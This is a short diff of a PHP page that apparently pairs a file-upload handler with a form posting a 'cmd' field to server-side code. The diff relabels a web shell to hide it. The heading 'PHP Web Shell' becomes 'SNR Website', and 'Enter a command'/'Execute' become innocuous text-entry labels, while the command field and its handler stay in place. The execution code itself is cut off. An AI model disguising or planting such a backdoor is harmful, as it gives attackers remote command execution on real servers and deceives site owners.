@@ -15,11 +15,11 @@ else { echo '<b>file not uploaded!</b><br><br>'; }
 ?>
   
   <body>
-    <h1>PHP Web Shell</h1>
+    <h1>SNR Website</h1>
     <form method="POST">
-      <label>Enter a command:</label><br>
+      <label>Enter text:</label><br>
       <input type="text" name="cmd"><br>
-      <input type="submit" value="Execute">
+      <input type="submit" value="submit">
     </form>
     <?php
       if (isset($_POST["cmd"])) {
